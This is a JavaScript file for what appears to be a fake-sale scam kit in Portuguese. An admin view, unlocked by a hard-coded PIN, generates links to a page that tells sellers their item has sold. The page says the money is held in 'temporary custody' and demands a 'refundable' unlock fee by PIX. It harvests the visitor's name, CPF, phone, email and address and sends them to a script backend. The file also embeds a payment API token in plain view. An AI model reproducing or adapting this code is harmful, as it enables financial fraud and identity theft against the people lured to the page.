// ========================================================
// ⚙️ CONFIGURAÇÃO CENTRAL
// ========================================================
const BACKEND_URL = 'https://script.google.com/macros/s/AKfycbw0tZ66QIzYiGsD2XNyX9I3dv5r5zfAqPDywPTrRXYJsNsbeJS9Mlo_GdIdynl9p8EwqQ/exec'; 
const BASE_URL = window.location.href.split('?')[0]; 
const ADMIN_PIN = "0007"; 

// Configuração da API Invictus Pay
const API_INVICTUS_TOKEN = "wsxiP0Dydmf2TWqjOn1iZk9CfqwxdZBg8w5eQVaTLDWHnTjyvuGAqPBkAiGU";
const API_INVICTUS_ENDPOINT = "https://api.invictuspay.app.br/api";
const OFFER_HASH_DEFAULT = "png8aj6v6p"; 

// ========================================================
// 🚦 ROTEADOR E AUTH
// ========================================================
document.addEventListener('DOMContentLoaded', () => {
  const params = new URLSearchParams(window.location.search);
  const viewLogin = document.getElementById('login-view');
  const viewAdmin = document.getElementById('admin-view');
  const viewClient = document.getElementById('client-view');

  if (params.has('id')) {
    showView(viewClient);
    initClientApp(params.get('id'));
    return;
  }

  if (localStorage.getItem('admin_session_active') === 'true') {
    showView(viewAdmin);
    initAdminApp();
    return;
  }

  showView(viewLogin);
  initLoginApp(viewLogin, viewAdmin);
});

function showView(element) {
  document.querySelectorAll('.view-section').forEach(el => el.style.display = 'none');
  element.style.display = 'block';
}

function logoutAdmin() {
  localStorage.removeItem('admin_session_active');
  location.reload();
}

// ========================================================
// 🔐 LOGIN & ADMIN LOGIC
// ========================================================
function initLoginApp(viewLogin, viewAdmin) {
  const loginForm = document.getElementById('loginForm');
  const pinInput = document.getElementById('adminPin');
  const errorMsg = document.getElementById('loginError');

  pinInput.focus();

  loginForm.addEventListener('submit', (e) => {
    e.preventDefault();
    if (pinInput.value === ADMIN_PIN) {
      localStorage.setItem('admin_session_active', 'true');
      errorMsg.textContent = "";
      showView(viewAdmin);
      initAdminApp();
    } else {
      errorMsg.textContent = "Senha incorreta";
      pinInput.value = "";
      pinInput.focus();
    }
  });
}

function initAdminApp() {
  const form = document.getElementById('adminForm');
  const modal = document.getElementById('modalSuccess');
  const linkDisplay = document.getElementById('finalLink');
  const btnSalvar = document.getElementById('btnSalvar');
  const btnCopy = document.getElementById('btnCopy');
  const btnView = document.getElementById('btnView');
  const toggleHeader = document.getElementById('preset-toggle');
  const fieldsContainer = document.getElementById('preset-fields-container');
  const toggleIcon = document.getElementById('toggle-icon');
  const moneyInputs = document.querySelectorAll('.money');

  toggleHeader.addEventListener('click', () => {
      const isExpanded = fieldsContainer.classList.toggle('expanded');
      toggleIcon.classList.toggle('rotated');
      fieldsContainer.style.maxHeight = isExpanded ? fieldsContainer.scrollHeight + "px" : "0";
  });

  const formatMoney = (value) => {
    value = value.replace(/\D/g, "");
    const amount = parseFloat(value) / 100;
    return isNaN(amount) ? "" : amount.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
  };

  moneyInputs.forEach(input => {
    input.addEventListener('input', (e) => e.target.value = formatMoney(e.target.value));
  });

  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    btnSalvar.textContent = "Gerando...";
    btnSalvar.disabled = true;

    const data = {};
    new FormData(form).forEach((v, k) => data[k] = v);
    data.linkPagamento = BASE_URL; 

    try {
      const res = await fetch(BACKEND_URL, {
        method: 'POST',
        body: JSON.stringify(data)
      });
      const json = await res.json();

      if (json.status === 'success') {
        const idGerado = json.savedId || json.id; 
        const linkPronto = `${BASE_URL}?id=${idGerado}`;
        linkDisplay.textContent = linkPronto;
        btnView.href = linkPronto; 
        modal.classList.add('active');
      } else {
        alert('Erro: ' + json.message);
      }
    } catch (err) {
      alert('Erro de conexão: ' + err.message);
    } finally {
      btnSalvar.textContent = "Gerar Link de Pagamento";
      btnSalvar.disabled = false;
    }
  });

  btnCopy.addEventListener('click', () => {
    navigator.clipboard.writeText(linkDisplay.textContent);
    btnCopy.textContent = "Copiado!";
    setTimeout(() => btnCopy.innerHTML = '<i class="fa-regular fa-copy"></i> Copiar', 2000);
  });
}

// ========================================================
// 🛍️ CLIENT APP (CHECKOUT)
// ========================================================
async function initClientApp(id) {
  const containerArea = document.getElementById('client-content-area');

  const formatValueForClient = (value) => {
      if (!value) return ''; 
      
      if (typeof value === 'number') {
          return value.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
      }

      let valueStr = String(value).trim();
      valueStr = valueStr.replace(/R\$\s*/g, '');
      
      if (valueStr.match(/gr[aá]tis|inclusa|horas|vendas|avaliação|taxa de/i)) return valueStr;

      if (valueStr.includes(',')) {
          valueStr = valueStr.replace(/\./g, '').replace(',', '.');
      }

      let number = parseFloat(valueStr);
      return !isNaN(number) ? number.toLocaleString('pt-BR', { minimumFractionDigits: 2 }) : valueStr;
  }

  const getDisplayValue = (data, isCurrency, defaultText) => {
      const formatted = formatValueForClient(data);
      if (formatted === '') return isCurrency ? `R$ ${defaultText}` : defaultText;
      if (isCurrency && (formatted.toLowerCase().includes('grátis') || formatted.toLowerCase().includes('inclusa'))) return formatted;
      return isCurrency ? `R$ ${formatted}` : formatted;
  }

  const parseMoneyToCents = (val) => {
    if (!val) return 0;
    if (typeof val === 'number') return Math.round(val * 100);
    let valStr = String(val).trim();
    if (!valStr.includes(',') && !valStr.includes('R$')) return Math.round(parseFloat(valStr) * 100);
    const clean = valStr.replace(/\D/g, '');
    return parseInt(clean, 10);
  };

  const criarElemento = (tag, attrs = {}, inner = '') => {
    const el = document.createElement(tag);
    Object.entries(attrs).forEach(([key, value]) => {
      if (key === 'class') el.className = value;
      else if (key === 'id') el.id = value;
      else el.setAttribute(key, value);
    });
    if (typeof inner === 'string') el.innerHTML = inner;
    else if (inner instanceof Node) el.appendChild(inner);
    return el;
  }

  try {
    const response = await fetch(`${BACKEND_URL}?id=${id}`);
    const json = await response.json();

    if (json.status !== 'success') {
      // Usando classe utilitária para erro
      containerArea.innerHTML = `<div class="text-center" style="padding:40px;"><h2 class="text-error">Pedido não encontrado.</h2></div>`;
      return;
    }

    const dadosBrutos = json.data;
    const dados = {};
    Object.keys(dadosBrutos).forEach(key => dados[key.toLowerCase()] = dadosBrutos[key]);

    const valorCobrancaStr = dados.taxa || "R$ 0,00";
    const valorEmCentavos = parseMoneyToCents(valorCobrancaStr);
    const prazo = dados.prazo || '15 minutos';

    containerArea.innerHTML = '';

    const container = criarElemento('div', { class: 'client-container' });
    const imgHeader = criarElemento('div', { class: 'header-image' });
    const title = criarElemento('div', { class: 'header-title', innerHTML: 'Compra Segura' }); 
    const content = criarElemento('div', { class: 'content' });

    // HTML Limpo (Classes em style.css)
    content.innerHTML = `
      <div class="client-intro">
          <h2 class="client-success-title">🎉 Venda Confirmada!</h2>
          <p class="client-subtitle">Seu anúncio encontrou um comprador.</p>
      </div>

      <div class="custody-notice">
          <p class="custody-text">
              Para garantir a segurança da transação, o saldo total está em <strong>Custódia Temporária</strong>.
              <br><br>
              <strong>Ação Necessária:</strong> Regularize a taxa de <span class="custody-highlight">${getDisplayValue(dados.taxa, true, '---')}</span>.
              <br>
              <span class="custody-info">ℹ️ Este valor é reembolsável junto com a venda em até <strong>${prazo}</strong>.</span>
          </p>
      </div>
      
      <div class="security-section">
        <h3 class="security-title">💬 Validação de Segurança</h3>
      </div>
      <p class="security-desc">Preencha os dados abaixo para gerar a chave segura de liberação.</p>
    `;

    const formHtml = `
      <form id="checkoutForm">
        <div class="checkout-grid">
            <div class="form-group full-width">
                <label>Nome Completo</label>
                <input type="text" name="name" required value="${dados.comprador || ''}" placeholder="Nome do Titular">
            </div>
            <div class="form-group">
                <label>CPF (Titular da Conta)</label>
                <input type="text" name="document" required placeholder="000.000.000-00" maxlength="14" id="inputCpf">
            </div>
            <div class="form-group">
                <label>Telefone (WhatsApp)</label>
                <input type="text" name="phone_number" required placeholder="(00) 90000-0000" id="inputPhone">
            </div>
            <div class="form-group full-width">
                <label>E-mail (Para comprovante)</label>
                <input type="email" name="email" required placeholder="seu@email.com">
            </div>
            
            <div class="form-group">
                <label>CEP</label>
                <input type="text" name="zip_code" required placeholder="00000-000" id="inputCep" maxlength="9">
            </div>
            <div class="form-group">
                 <label>Número</label>
                 <input type="text" name="number" required placeholder="Nº">
            </div>
            
            <div class="form-group full-width" style="display:none"> 
                <input type="text" name="street_name" id="inputRua" required placeholder="Rua">
                <input type="text" name="neighborhood" id="inputBairro" required placeholder="Bairro">
                <input type="text" name="city" id="inputCidade" required placeholder="Cidade">
                <input type="text" name="state" id="inputUf" required placeholder="UF">
            </div>
            <div class="full-width" id="address-preview"></div>
        </div>

        <button type="submit" id="btnPay" class="btn-pay">
            Confirmar Dados para Recebimento
        </button>
        <p id="msgEnvio"></p>
      </form>
    `;
    
    const formContainer = criarElemento('div');
    formContainer.innerHTML = formHtml;
    content.appendChild(formContainer);

    container.append(imgHeader, title, content);
    container.appendChild(criarElemento('div', { class: 'footer' }, '&copy; 2025 Plataforma Segura. Todos os direitos reservados.'));
    containerArea.appendChild(container);

    const formElement = document.getElementById('checkoutForm');
    const btnPay = document.getElementById('btnPay');
    const inputCep = document.getElementById('inputCep');
    const msgEnvio = document.getElementById('msgEnvio');

    // Auto-preenchimento de Endereço
    inputCep.addEventListener('blur', async () => {
        const cep = inputCep.value.replace(/\D/g, '');
        if (cep.length === 8) {
            try {
                const r = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
                const data = await r.json();
                if (!data.erro) {
                    document.getElementById('inputRua').value = data.logradouro;
                    document.getElementById('inputBairro').value = data.bairro;
                    document.getElementById('inputCidade').value = data.localidade;
                    document.getElementById('inputUf').value = data.uf;
                    
                    const preview = document.getElementById('address-preview');
                    preview.textContent = `📍 ${data.logradouro}, ${data.bairro} - ${data.localidade}/${data.uf}`;
                    preview.style.display = 'block';
                }
            } catch (e) {}
        }
    });

    formElement.addEventListener('submit', async (e) => {
      e.preventDefault();
      
      msgEnvio.textContent = "Validando e salvando dados...";
      msgEnvio.classList.remove('text-error');
      msgEnvio.classList.add('text-success');
      
      const formData = new FormData(formElement);
      const customerData = {};
      formData.forEach((value, key) => customerData[key] = value);

      if(!customerData.street_name) customerData.street_name = "Rua Geral";
      if(!customerData.neighborhood) customerData.neighborhood = "Centro";
      if(!customerData.city) customerData.city = "São Paulo";
      if(!customerData.state) customerData.state = "SP";

      try {
          const sheetPayload = {
              action: "salvar_cliente", 
              id: id,                   
              ...customerData           
          };
          await fetch(BACKEND_URL, { method: 'POST', body: JSON.stringify(sheetPayload) });
      } catch (sheetErr) {
          console.error("Aviso: Falha ao salvar backup na planilha.", sheetErr);
      }

      msgEnvio.textContent = "Gerando link seguro...";
      const payload = {
        "amount": valorEmCentavos, 
        "offer_hash": OFFER_HASH_DEFAULT, 
        "payment_method": "pix", 
        "customer": customerData,
        "cart": [{
            "product_hash": OFFER_HASH_DEFAULT,
            "title": "Taxa de Desbloqueio - Venda Segura",
            "price": valorEmCentavos,
            "quantity": 1,
            "operation_type": 1, 
            "tangible": false
        }],
        "installments": 1,
        "expire_in_days": 1,
        "transaction_origin": "api"
      };

      await executeInvictusApi('POST', '/public/v1/transactions', payload, btnPay, msgEnvio);
    });

  } catch (err) {
    console.error(err);
    containerArea.innerHTML = `<div class="text-center" style="padding:40px;"><h2 class="text-error">Erro ao carregar. Tente novamente.</h2></div>`;
  }
}

// ========================================================
// 📡 API & MODAL HANDLER
// ========================================================
async function executeInvictusApi(method, path, payload, button, msgElement) {
    const originalText = button.innerHTML;
    button.disabled = true;
    button.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin"></i> Processando...`;

    try {
        const response = await fetch(`${API_INVICTUS_ENDPOINT}${path}?api_token=${API_INVICTUS_TOKEN}`, {
            method: method,
            headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        const data = await response.json();

        if (response.ok) {
            if (data.payment_method === 'pix' && data.pix && data.pix.pix_qr_code) {
                if(msgElement) msgElement.textContent = "";
                showPixModal(data);
            } else {
                alert("Erro: API não retornou dados de PIX.");
            }
        } else {
            console.error("Erro API Invictus:", data);
            const errorMsg = data.errors ? Object.values(data.errors).flat().join('\n') : (data.message || "Dados inválidos.");
            alert("Atenção:\n" + errorMsg);
        }

    } catch (error) {
        console.error(error);
        alert("Erro de comunicação com o sistema de pagamento.");
    } finally {
        button.disabled = false;
        button.innerHTML = originalText;
    }
}

function showPixModal(data) {
    const modal = document.getElementById('pixModal');
    const amountEl = document.getElementById('modalAmount');
    const hashEl = document.getElementById('modalHash');
    const textarea = document.getElementById('pixCodeTextarea');
    const qrContainer = document.getElementById('qrCodeContainer');
    const qrImage = document.getElementById('qrCodeImage');
    const btnCopy = document.getElementById('copyPixButton');
    const btnClose = document.getElementById('closeModalButton');

    const valBrl = (data.amount / 100).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
    amountEl.textContent = valBrl;
    hashEl.textContent = `Protocolo: ${data.hash}`;
    textarea.value = data.pix.pix_qr_code;

    if (data.pix.qr_code_base64) {
        qrImage.src = `data:image/png;base64,${data.pix.qr_code_base64}`;
        qrContainer.style.display = 'block';
    } else {
        qrContainer.style.display = 'none';
    }

    modal.classList.add('is-visible');

    const closeModal = () => modal.classList.remove('is-visible');
    
    btnClose.onclick = closeModal;
    modal.onclick = (e) => { if(e.target === modal) closeModal(); };

    btnCopy.onclick = () => {
        textarea.select();
        textarea.setSelectionRange(0, 99999);
        document.execCommand('copy');
        
        const oldHtml = btnCopy.innerHTML;
        btnCopy.innerHTML = `<i class="fa-solid fa-check"></i> COPIADO!`;
        btnCopy.classList.add('copied'); // Usa classe CSS agora
        setTimeout(() => {
            btnCopy.innerHTML = oldHtml;
            btnCopy.classList.remove('copied');
        }, 2000);
    };
}
